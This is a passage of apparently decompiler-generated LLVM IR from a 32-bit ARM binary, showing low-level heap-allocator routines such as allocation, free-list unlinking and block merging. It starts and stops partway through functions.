  store i32 ptrtoint (i32** @global_var_172c4.231 to i32), i32* %r0.global-to-local, align 4
  %v3_c2ec = call i32 @function_c494(i32* bitcast (i32** @global_var_172c4.231 to i32*), i32 %v2_c200)
  store i32 %v3_c2ec, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_17454.227 to i32), i32* %r0.global-to-local, align 4
  store i32 49920, i32* @lr, align 4
  %v1_c2fc = call i32 @function_cdec()
  store i32 %v1_c2fc, i32* %r0.global-to-local, align 4
  %v2_c300 = icmp eq i32 %v3_c2ec, 0
  br i1 %v2_c300, label %dec_label_pc_c318, label %dec_label_pc_c308

dec_label_pc_c308:                                ; preds = %dec_label_pc_c214, %dec_label_pc_c2c4
  %v1_c30c = phi i32 [ %v3_c238, %dec_label_pc_c214 ], [ %v3_c2ec, %dec_label_pc_c2c4 ]
  %v2_c308 = load i32, i32* %stack_var_-20, align 4
  %v2_c30c = inttoptr i32 %v1_c30c to i32*
  store i32 %v2_c308, i32* %v2_c30c, align 4
  %v3_c30c = load i32, i32* %r4.global-to-local, align 4
  %v4_c30c = add i32 %v3_c30c, 4
  store i32 %v4_c30c, i32* %r4.global-to-local, align 4
  %v2_c310 = icmp eq i32 %v4_c30c, 0
  br i1 %v2_c310, label %dec_label_pc_c318, label %dec_label_pc_c328

dec_label_pc_c318:                                ; preds = %dec_label_pc_c308, %dec_label_pc_c2c4, %dec_label_pc_c2ac, %dec_label_pc_c20c
  %v0_c318 = call i32 @function_bdd4()
  store i32 %v0_c318, i32* %r0.global-to-local, align 4
  %v2_c320 = inttoptr i32 %v0_c318 to i32*
  store i32 12, i32* %v2_c320, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_c328

dec_label_pc_c328:                                ; preds = %dec_label_pc_c308, %dec_label_pc_c318
  %v0_c328 = phi i32 [ %v4_c30c, %dec_label_pc_c308 ], [ 0, %dec_label_pc_c318 ]
  store i32 %v0_c328, i32* %r0.global-to-local, align 4
  store i32 %v3_c1f8, i32* @r4, align 4
  store i32 %v6_c1f8, i32* @r5, align 4
  store i32 %v9_c1f8, i32* @r6, align 4
  ret i32 %v0_c328

; uselistorder directives
  uselistorder i32 %v0_c328, { 1, 0 }
  uselistorder i32 %v3_c2ec, { 1, 0, 2 }
  uselistorder i32 %v1_c29c, { 1, 0, 2 }
  uselistorder i32 %v1_c288, { 2, 0, 4, 3, 1, 5 }
  uselistorder i32 %v3_c238, { 1, 0, 2 }
  uselistorder i32 %v0_c1fc, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 6, 7, 8, 9, 11, 10, 19, 13, 12, 14, 15, 16, 17, 18, 0, 1 }
  uselistorder label %dec_label_pc_c328, { 1, 0 }
  uselistorder label %dec_label_pc_c308, { 1, 0 }
  uselistorder label %dec_label_pc_c2ac, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_c214, { 1, 0 }
}

define i32 @function_c34c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c34c:
  %stack_var_-12 = alloca i32, align 4
  %v3_c34c = load i32, i32* @r4, align 4
  store i32 %v3_c34c, i32* %stack_var_-12, align 4
  %v6_c34c = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v2_c354 = mul i32 %arg2, %arg1
  store i32 %v2_c354, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_c358 = icmp eq i32 %arg1, 0
  store i32 %v2_c354, i32* @r0, align 4
  br i1 %v2_c358, label %dec_label_pc_c384, label %dec_label_pc_c364

dec_label_pc_c364:                                ; preds = %dec_label_pc_c34c
  %v0_c364 = call i32 @function_b4cc()
  %v0_c368 = load i32, i32* @r5, align 4
  %v9_c368 = icmp eq i32 %v0_c368, %v0_c364
  store i32 0, i32* @r5, align 4
  br i1 %v9_c368, label %dec_label_pc_c364.dec_label_pc_c384_crit_edge, label %dec_label_pc_c374

dec_label_pc_c364.dec_label_pc_c384_crit_edge:    ; preds = %dec_label_pc_c364
  %v0_c384.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c384

dec_label_pc_c374:                                ; preds = %dec_label_pc_c364
  %v0_c374 = call i32 @function_bdd4()
  %v2_c37c = inttoptr i32 %v0_c374 to i32*
  store i32 12, i32* %v2_c37c, align 4
  br label %dec_label_pc_c39c

dec_label_pc_c384:                                ; preds = %dec_label_pc_c364.dec_label_pc_c384_crit_edge, %dec_label_pc_c34c
  %v0_c384 = phi i32 [ %v0_c384.pre, %dec_label_pc_c364.dec_label_pc_c384_crit_edge ], [ %v2_c354, %dec_label_pc_c34c ]
  %v1_c388 = call i32 @function_c1f8(i32 %v0_c384)
  store i32 %v1_c388, i32* @r5, align 4
  store i32 50076, i32* @lr, align 4
  %v1_c398 = icmp ne i32 %v1_c388, 0
  call void @__pseudo_cond_branch(i1 %v1_c398, i32 ptrtoint (i32* @global_var_be40.238 to i32))
  br label %dec_label_pc_c39c

dec_label_pc_c39c:                                ; preds = %dec_label_pc_c374, %dec_label_pc_c384
  %v0_c39c = load i32, i32* @r5, align 4
  %v2_c3a0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_c3a0, i32* @r4, align 4
  store i32 %v6_c34c, i32* @r5, align 4
  ret i32 %v0_c39c

; uselistorder directives
  uselistorder i32 (i32)* @function_c1f8, { 1, 0, 8, 5, 7, 6, 4, 3, 2 }
  uselistorder i32 ()* @function_b4cc, { 2, 4, 3, 0, 1 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c39c, { 1, 0 }
}

define i32 @function_c3a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_c3a4:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_c3a4 = icmp eq i32 %arg1, 0
  %v3_c3a8 = load i32, i32* @r4, align 4
  store i32 %v3_c3a8, i32* %stack_var_-24, align 4
  %v6_c3a8 = load i32, i32* @r5, align 4
  %v9_c3a8 = load i32, i32* @r6, align 4
  %v15_c3a8 = load i32, i32* @r8, align 4
  br i1 %v2_c3a4, label %bb, label %bb11

bb:                                               ; preds = %dec_label_pc_c3a4
  ret i32 0

bb11:                                             ; preds = %dec_label_pc_c3a4
  %v1_c3b0 = add i32 %arg1, -4
  %v2_c3b0 = inttoptr i32 %v1_c3b0 to i32*
  %v3_c3b0 = load i32, i32* %v2_c3b0, align 4
  store i32 %v3_c3b0, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_172c4.231 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_c3b0, i32* @r4, align 4
  %v1_c3c8 = call i32 @function_cdec()
  %v0_c3cc = load i32, i32* @r4, align 4
  %v0_c3d0 = load i32, i32* @r5, align 4
  %v4_c3d8 = call i32 @function_c55c(i32* bitcast (i32** @global_var_172c4.231 to i32*), i32 %v0_c3cc, i32 %v0_c3d0)
  %v1_c3e0 = inttoptr i32 %v4_c3d8 to i32*
  %v2_c3e0 = load i32, i32* %v1_c3e0, align 4
  store i32 %v2_c3e0, i32* %r6.global-to-local, align 4
  %v2_c3e4 = load i32, i32* @global_var_1747c.234, align 4
  %v4_c3e8 = mul i32 %v2_c3e4, 8
  %v6_c3e8 = icmp ult i32 %v2_c3e0, %v4_c3e8
  store i32 %v4_c3d8, i32* @r4, align 4
  br i1 %v6_c3e8, label %dec_label_pc_c428, label %dec_label_pc_c3f4

dec_label_pc_c3f4:                                ; preds = %bb11
  %v1_c3fc = call i32 @function_cdec()
  %v1_c404 = call i32 @function_d5e4(i32 0)
  %v0_c408 = load i32, i32* @r4, align 4
  %v1_c408 = add i32 %v0_c408, 12
  store i32 %v1_c408, i32* @r5, align 4
  %v9_c40c = icmp eq i32 %v1_c408, %v1_c404
  br i1 %v9_c40c, label %dec_label_pc_c430, label %dec_label_pc_c414

dec_label_pc_c414:                                ; preds = %dec_label_pc_c3f4
  %v1_c420 = call i32 @function_cdec()
  br label %dec_label_pc_c428

dec_label_pc_c428:                                ; preds = %bb11, %dec_label_pc_c414, %bb14
  %v2_c428 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_c428, i32* @r4, align 4
  store i32 %v6_c3a8, i32* @r5, align 4
  store i32 %v9_c3a8, i32* %r6.global-to-local, align 4
  store i32 %v15_c3a8, i32* %r8.global-to-local, align 4
  %v0_c42c = call i32 @function_cdec()
  %v0_c430.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c430

dec_label_pc_c430:                                ; preds = %dec_label_pc_c3f4, %dec_label_pc_c428
  %v1_c438 = phi i32 [ %v0_c408, %dec_label_pc_c3f4 ], [ %v0_c430.pre, %dec_label_pc_c428 ]
  %v1_c430 = add i32 %v1_c438, 4
  %v2_c430 = inttoptr i32 %v1_c430 to i32*
  %v3_c430 = load i32, i32* %v2_c430, align 4
  %v2_c434 = icmp eq i32 %v3_c430, 0
  br i1 %v2_c434, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_c430
  %v2_c438 = add i32 %v1_c438, 8
  %v3_c438 = inttoptr i32 %v2_c438 to i32*
  %v4_c438 = load i32, i32* %v3_c438, align 4
  %v3_c43c = add i32 %v3_c430, 8
  %v4_c43c = inttoptr i32 %v3_c43c to i32*
  store i32 %v4_c438, i32* %v4_c43c, align 4
  %v0_c440.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c430, %bb12
  %v0_c440 = phi i32 [ %v1_c438, %dec_label_pc_c430 ], [ %v0_c440.pre, %bb12 ]
  %v1_c440 = add i32 %v0_c440, 8
  %v2_c440 = inttoptr i32 %v1_c440 to i32*
  %v3_c440 = load i32, i32* %v2_c440, align 4
  %v1_c444 = add i32 %v0_c440, 4
  %v2_c444 = inttoptr i32 %v1_c444 to i32*
  %v3_c444 = load i32, i32* %v2_c444, align 4
  %v2_c448 = icmp eq i32 %v3_c440, 0
  br i1 %v2_c448, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_c44c = add i32 %v3_c440, 4
  %v4_c44c = inttoptr i32 %v3_c44c to i32*
  store i32 %v3_c444, i32* %v4_c44c, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_c450 = load i32, i32* %r8.global-to-local, align 4
  %v3_c450 = inttoptr i32 %v2_c450 to i32*
  store i32 %v3_c444, i32* %v3_c450, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_c460 = call i32 @function_cdec()
  %v0_c464 = load i32, i32* %r6.global-to-local, align 4
  %v1_c464 = load i32, i32* @r4, align 4
  %v0_c46c = load i32, i32* @r5, align 4
  %v2_c464 = sub i32 12, %v0_c464
  %v1_c468 = add i32 %v2_c464, %v1_c464
  %v2_c46c = sub i32 %v1_c468, %v0_c46c
  %v1_c470 = call i32 @function_d5e4(i32 %v2_c46c)
  br label %dec_label_pc_c428

; uselistorder directives
  uselistorder i32 %v0_c440, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_d5e4, { 2, 1, 0 }
  uselistorder i32** @global_var_172c4.231, { 1, 0 }
  uselistorder i32* @r8, { 9, 5, 1, 0, 6, 3, 2, 4, 7, 8, 10, 12, 11, 13, 14, 15, 16 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_c430, { 1, 0 }
  uselistorder label %dec_label_pc_c428, { 2, 1, 0 }
}

define i32 @function_c494(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c494:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_c494 = inttoptr i32 %arg2 to i32*
  %v2_c494 = load i32, i32* %v1_c494, align 4
  %v3_c498 = load i32, i32* @r4, align 4
  store i32 %v3_c498, i32* %stack_var_-8, align 4
  %v1_c49c = add i32 %v2_c494, 3
  %v1_c4a0 = and i32 %v1_c49c, -4
  store i32 %v1_c4a0, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_c4a8 = icmp ugt i32 %v1_c4a0, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_c4b0 = load i32, i32* %arg1, align 4
  store i32 %v2_c4b0, i32* %r0.global-to-local, align 4
  br i1 %v2_c4a8, label %dec_label_pc_c51c.preheader, label %bb

bb:                                               ; preds = %dec_label_pc_c494
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c51c.preheader

dec_label_pc_c51c.preheader:                      ; preds = %dec_label_pc_c494, %bb
  %v1_c4d0 = phi i32 [ %v1_c4a0, %dec_label_pc_c494 ], [ 12, %bb ]
  %v2_c51c9 = icmp eq i32 %v2_c4b0, 0
  br i1 %v2_c51c9, label %dec_label_pc_c524, label %dec_label_pc_c4bc

dec_label_pc_c4bc:                                ; preds = %dec_label_pc_c51c.preheader, %dec_label_pc_c518
  %v2_c4d4 = phi i32 [ %v3_c518, %dec_label_pc_c518 ], [ %v2_c4b0, %dec_label_pc_c51c.preheader ]
  %v1_c4bc = inttoptr i32 %v2_c4d4 to i32*
  %v2_c4bc = load i32, i32* %v1_c4bc, align 4
  store i32 %v2_c4bc, i32* %ip.global-to-local, align 4
  %v3_c4c0 = icmp ult i32 %v2_c4bc, %v1_c4d0
  br i1 %v3_c4c0, label %dec_label_pc_c518, label %dec_label_pc_c4c8

dec_label_pc_c4c8:                                ; preds = %dec_label_pc_c4bc
  %v1_c4c8 = add i32 %v1_c4d0, 44
  %v3_c4cc = icmp ult i32 %v2_c4bc, %v1_c4c8
  br i1 %v3_c4cc, label %dec_label_pc_c4dc, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_c4c8
  %v2_c4c0.le = sub i32 %v2_c4bc, %v1_c4d0
  store i32 %v2_c4c0.le, i32* %v1_c4bc, align 4
  %v0_c508.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_c510.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_c4dc:                                ; preds = %dec_label_pc_c4c8
  %v1_c4dc = add i32 %v2_c4d4, 4
  %v2_c4dc = inttoptr i32 %v1_c4dc to i32*
  %v3_c4dc = load i32, i32* %v2_c4dc, align 4
  store i32 %v3_c4dc, i32* %r2.global-to-local, align 4
  %v2_c4e0 = icmp eq i32 %v3_c4dc, 0
  br i1 %v2_c4e0, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_c4dc
  %v2_c4e4 = add i32 %v2_c4d4, 8
  %v3_c4e4 = inttoptr i32 %v2_c4e4 to i32*
  %v4_c4e4 = load i32, i32* %v3_c4e4, align 4
  %v3_c4e8 = add i32 %v3_c4dc, 8
  %v4_c4e8 = inttoptr i32 %v3_c4e8 to i32*
  store i32 %v4_c4e4, i32* %v4_c4e8, align 4
  %v0_c4ec.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_c4dc, %bb27
  %v0_c4ec = phi i32 [ %v2_c4d4, %dec_label_pc_c4dc ], [ %v0_c4ec.pre, %bb27 ]
  %v1_c4ec = add i32 %v0_c4ec, 8
  %v2_c4ec = inttoptr i32 %v1_c4ec to i32*
  %v3_c4ec = load i32, i32* %v2_c4ec, align 4
  %v1_c4f0 = add i32 %v0_c4ec, 4
  %v2_c4f0 = inttoptr i32 %v1_c4f0 to i32*
  %v3_c4f0 = load i32, i32* %v2_c4f0, align 4
  %v2_c4f4 = icmp eq i32 %v3_c4ec, 0
  br i1 %v2_c4f4, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_c4f8 = add i32 %v3_c4ec, 4
  %v4_c4f8 = inttoptr i32 %v3_c4f8 to i32*
  store i32 %v3_c4f0, i32* %v4_c4f8, align 4
  %v1_c500 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_c500, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_c4fc = load i32, i32* %r1.global-to-local, align 4
  %v3_c4fc = inttoptr i32 %v2_c4fc to i32*
  store i32 %v3_c4f0, i32* %v3_c4fc, align 4
  %v1_c504.pre = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_c504.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_c510 = phi i32 [ %v0_c510.pre, %.thread._crit_edge ], [ %v1_c500, %bb28 ], [ %v1_c504.pre, %.thread5 ]
  %v0_c508 = phi i32 [ %v0_c508.pre, %.thread._crit_edge ], [ %v1_c500, %bb28 ], [ %v1_c504.pre, %.thread5 ]
  %v1_c508 = load i32, i32* %r0.global-to-local, align 4
  %v2_c508 = sub i32 %v1_c508, %v0_c508
  %v1_c50c = add i32 %v2_c508, 12
  store i32 %v1_c50c, i32* %r0.global-to-local, align 4
  %v1_c510 = load i32, i32* %r4.global-to-local, align 4
  %v2_c510 = inttoptr i32 %v1_c510 to i32*
  store i32 %v0_c510, i32* %v2_c510, align 4
  %v2_c514 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_c514, i32* %r4.global-to-local, align 4
  ret i32 %v1_c50c

dec_label_pc_c518:                                ; preds = %dec_label_pc_c4bc
  %v1_c518 = add i32 %v2_c4d4, 4
  %v2_c518 = inttoptr i32 %v1_c518 to i32*
  %v3_c518 = load i32, i32* %v2_c518, align 4
  store i32 %v3_c518, i32* %r0.global-to-local, align 4
  %v2_c51c = icmp eq i32 %v3_c518, 0
  br i1 %v2_c51c, label %dec_label_pc_c51c.dec_label_pc_c524_crit_edge, label %dec_label_pc_c4bc

dec_label_pc_c51c.dec_label_pc_c524_crit_edge:    ; preds = %dec_label_pc_c518
  br label %dec_label_pc_c524

dec_label_pc_c524:                                ; preds = %dec_label_pc_c51c.dec_label_pc_c524_crit_edge, %dec_label_pc_c51c.preheader
  store i32 %v3_c498, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_c518, { 1, 2, 0 }
  uselistorder i32 %v0_c4ec, { 1, 0 }
  uselistorder i32 %v2_c4bc, { 1, 0, 2, 3 }
  uselistorder i32 %v2_c4d4, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_c4d0, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_c4bc, { 1, 0 }
  uselistorder label %dec_label_pc_c51c.preheader, { 1, 0 }
}

define i32 @function_c528() local_unnamed_addr {
dec_label_pc_c528:
  %v0_c528 = load i32, i32* @r2, align 4
  %v2_c528 = icmp eq i32 %v0_c528, 0
  %v0_c52c = load i32, i32* @r3, align 4
  %v1_c52c = load i32, i32* @r1, align 4
  %v2_c52c = add i32 %v1_c52c, 4
  %v3_c52c = inttoptr i32 %v2_c52c to i32*
  store i32 %v0_c52c, i32* %v3_c52c, align 4
  %v0_c530 = load i32, i32* @r2, align 4
  %v1_c530 = load i32, i32* @r1, align 4
  %v2_c530 = add i32 %v1_c530, 8
  %v3_c530 = inttoptr i32 %v2_c530 to i32*
  store i32 %v0_c530, i32* %v3_c530, align 4
  %v1_c538 = load i32, i32* @r1, align 4
  br i1 %v2_c528, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_c528
  %v2_c534 = load i32, i32* @r2, align 4
  %v3_c534 = add i32 %v2_c534, 4
  %v4_c534 = inttoptr i32 %v3_c534 to i32*
  store i32 %v1_c538, i32* %v4_c534, align 4
  br label %bb1

.thread:                                          ; preds = %dec_label_pc_c528
  %v2_c538 = load i32, i32* @r0, align 4
  %v3_c538 = inttoptr i32 %v2_c538 to i32*
  store i32 %v1_c538, i32* %v3_c538, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_c53c = load i32, i32* @r3, align 4
  %v2_c53c = icmp eq i32 %v0_c53c, 0
  br i1 %v2_c53c, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_c540 = load i32, i32* @r1, align 4
  %v3_c540 = add i32 %v0_c53c, 8
  %v4_c540 = inttoptr i32 %v3_c540 to i32*
  store i32 %v1_c540, i32* %v4_c540, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_c544 = load i32, i32* @r0, align 4
  ret i32 %v1_c544

; uselistorder directives
  uselistorder i32 %v1_c538, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_c548() local_unnamed_addr {
dec_label_pc_c548:
  %v0_c548 = load i32, i32* @r2, align 4
  %v2_c548 = icmp eq i32 %v0_c548, 0
  %v1_c54c = load i32, i32* @r1, align 4
  br i1 %v2_c548, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c548
  %v2_c54c = load i32, i32* @r0, align 4
  %v3_c54c = inttoptr i32 %v2_c54c to i32*
  store i32 %v1_c54c, i32* %v3_c54c, align 4
  br label %bb2

.thread:                                          ; preds = %dec_label_pc_c548
  %v3_c550 = add i32 %v0_c548, 4
  %v4_c550 = inttoptr i32 %v3_c550 to i32*
  store i32 %v1_c54c, i32* %v4_c550, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_c554 = load i32, i32* @r2, align 4
  %v1_c554 = load i32, i32* @r1, align 4
  %v2_c554 = add i32 %v1_c554, 8
  %v3_c554 = inttoptr i32 %v2_c554 to i32*
  store i32 %v0_c554, i32* %v3_c554, align 4
  %v1_c558 = load i32, i32* @r0, align 4
  ret i32 %v1_c558

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_c55c(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_c55c:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_c55c = load i32, i32* @r4, align 4
  store i32 %v3_c55c, i32* %stack_var_-20, align 4
  %v2_c560 = load i32, i32* %arg1, align 4
  store i32 %v2_c560, i32* %r4.global-to-local, align 4
  %v2_c564 = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_c5802 = icmp eq i32 %v2_c560, 0
  br i1 %v2_c5802, label %dec_label_pc_c630, label %dec_label_pc_c570

dec_label_pc_c570:                                ; preds = %dec_label_pc_c55c, %dec_label_pc_c578
  %v0_c5c0 = phi i32 [ %v0_c5c8, %dec_label_pc_c578 ], [ 0, %dec_label_pc_c55c ]
  %v0_c5c8 = phi i32 [ %v3_c57c, %dec_label_pc_c578 ], [ %v2_c560, %dec_label_pc_c55c ]
  %v1_c5845.in = phi i32 [ %v3_c57c, %dec_label_pc_c578 ], [ %v2_c560, %dec_label_pc_c55c ]
  %v1_c5845 = add i32 %v1_c5845.in, 12
  %v3_c570 = icmp ult i32 %v1_c5845, %arg2
  br i1 %v3_c570, label %dec_label_pc_c578, label %dec_label_pc_c590

dec_label_pc_c578:                                ; preds = %dec_label_pc_c570
  store i32 %v0_c5c8, i32* %r6.global-to-local, align 4
  %v1_c57c = add i32 %v0_c5c8, 4
  %v2_c57c = inttoptr i32 %v1_c57c to i32*
  %v3_c57c = load i32, i32* %v2_c57c, align 4
  store i32 %v3_c57c, i32* %r4.global-to-local, align 4
  %v2_c580 = icmp eq i32 %v3_c57c, 0
  br i1 %v2_c580, label %dec_label_pc_c580.dec_label_pc_c630.loopexit_crit_edge, label %dec_label_pc_c570

dec_label_pc_c590:                                ; preds = %dec_label_pc_c570
  %v1_c590 = inttoptr i32 %v0_c5c8 to i32*
  %v2_c590 = load i32, i32* %v1_c590, align 4
  %v2_c594 = sub i32 %v0_c5c8, %v2_c590
  %v1_c598 = add i32 %v2_c594, 12
  %v3_c59c = icmp uge i32 %v1_c598, %v2_c564
  %v9_c59c = icmp eq i32 %v1_c598, %v2_c564
  %v2_c5a0 = xor i1 %v9_c59c, true
  %v3_c5a0 = and i1 %v3_c59c, %v2_c5a0
  br i1 %v3_c5a0, label %dec_label_pc_c630, label %dec_label_pc_c5a4

dec_label_pc_c5a4:                                ; preds = %dec_label_pc_c590
  %v2_c5a4 = add i32 %v2_c590, %arg3
  store i32 %v2_c5a4, i32* %r7.global-to-local, align 4
  br i1 %v9_c59c, label %dec_label_pc_c5ac, label %dec_label_pc_c5d8

dec_label_pc_c5ac:                                ; preds = %dec_label_pc_c5a4
  %v2_c5ac = icmp eq i32 %v0_c5c0, 0
  br i1 %v2_c5ac, label %dec_label_pc_c624, label %dec_label_pc_c5b4

dec_label_pc_c5b4:                                ; preds = %dec_label_pc_c5ac
  %v1_c5b4 = add i32 %v0_c5c0, 12
  %v9_c5b8 = icmp eq i32 %v1_c5b4, %arg2
  br i1 %v9_c5b8, label %dec_label_pc_c5c0, label %dec_label_pc_c624

dec_label_pc_c5c0:                                ; preds = %dec_label_pc_c5b4
  %v1_c5c0 = inttoptr i32 %v0_c5c0 to i32*
  %v2_c5c0 = load i32, i32* %v1_c5c0, align 4
  %v1_c5c4 = add i32 %v0_c5c0, 8
  %v2_c5c4 = inttoptr i32 %v1_c5c4 to i32*
  %v3_c5c4 = load i32, i32* %v2_c5c4, align 4
  store i32 %v3_c5c4, i32* @r2, align 4
  store i32 %v0_c5c8, i32* @r1, align 4
  %v2_c5cc = add i32 %v2_c5c0, %v2_c5a4
  store i32 %v2_c5cc, i32* %r7.global-to-local, align 4
  %v0_c5d0 = call i32 @function_c548()
  br label %dec_label_pc_c624

dec_label_pc_c5d8:                                ; preds = %dec_label_pc_c5a4
  %v1_c5d8 = add i32 %v0_c5c8, 4
  %v2_c5d8 = inttoptr i32 %v1_c5d8 to i32*
  %v3_c5d8 = load i32, i32* %v2_c5d8, align 4
  store i32 %v3_c5d8, i32* %r5.global-to-local, align 4
  %v2_c5dc = icmp eq i32 %v3_c5d8, 0
  br i1 %v2_c5dc, label %dec_label_pc_c610, label %dec_label_pc_c5e4

dec_label_pc_c5e4:                                ; preds = %dec_label_pc_c5d8
  %v1_c5e4 = inttoptr i32 %v3_c5d8 to i32*
  %v2_c5e4 = load i32, i32* %v1_c5e4, align 4
  %v2_c5e8 = sub i32 %v3_c5d8, %v2_c5e4
  %v1_c5ec = add i32 %v2_c5e8, 12
  %v9_c5f0 = icmp eq i32 %v2_c564, %v1_c5ec
  br i1 %v9_c5f0, label %dec_label_pc_c5f8, label %dec_label_pc_c610

dec_label_pc_c5f8:                                ; preds = %dec_label_pc_c5e4
  store i32 %v0_c5c0, i32* @r2, align 4
  store i32 %v3_c5d8, i32* @r1, align 4
  %v2_c600 = add i32 %v2_c5e4, %v2_c5a4
  store i32 %v2_c600, i32* %r7.global-to-local, align 4
  %v0_c604 = call i32 @function_c548()
  %v0_c608 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_c608, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_c624

dec_label_pc_c610:                                ; preds = %dec_label_pc_c5e4, %dec_label_pc_c5d8
  %v2_c610 = add i32 %v0_c5c8, %arg3
  store i32 %v2_c610, i32* %r4.global-to-local, align 4
  store i32 %v3_c5d8, i32* @r3, align 4
  store i32 %v0_c5c0, i32* @r2, align 4
  store i32 %v2_c610, i32* @r1, align 4
  %v0_c620 = call i32 @function_c528()
  br label %dec_label_pc_c624

dec_label_pc_c624:                                ; preds = %dec_label_pc_c5b4, %dec_label_pc_c5ac, %dec_label_pc_c5f8, %dec_label_pc_c5c0, %dec_label_pc_c610
  %v0_c624 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_c624, i32* %r5.global-to-local, align 4
  %v0_c628 = load i32, i32* %r7.global-to-local, align 4
  %v2_c628 = inttoptr i32 %v0_c624 to i32*
  store i32 %v0_c628, i32* %v2_c628, align 4
  br label %dec_label_pc_c648

dec_label_pc_c580.dec_label_pc_c630.loopexit_crit_edge: ; preds = %dec_label_pc_c578
  br label %dec_label_pc_c630

dec_label_pc_c630:                                ; preds = %dec_label_pc_c55c, %dec_label_pc_c580.dec_label_pc_c630.loopexit_crit_edge, %dec_label_pc_c590
  %v1_c630 = add i32 %v2_c564, -12
  store i32 %v1_c630, i32* %r5.global-to-local, align 4
  %v3_c634 = inttoptr i32 %v1_c630 to i32*
  store i32 %arg3, i32* %v3_c634, align 4
  %v0_c638 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_c638, i32* @r3, align 4
  %v0_c63c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_c63c, i32* @r2, align 4
  %v0_c640 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_c640, i32* @r1, align 4
  %v0_c644 = call i32 @function_c528()
  br label %dec_label_pc_c648

dec_label_pc_c648:                                ; preds = %dec_label_pc_c624, %dec_label_pc_c630
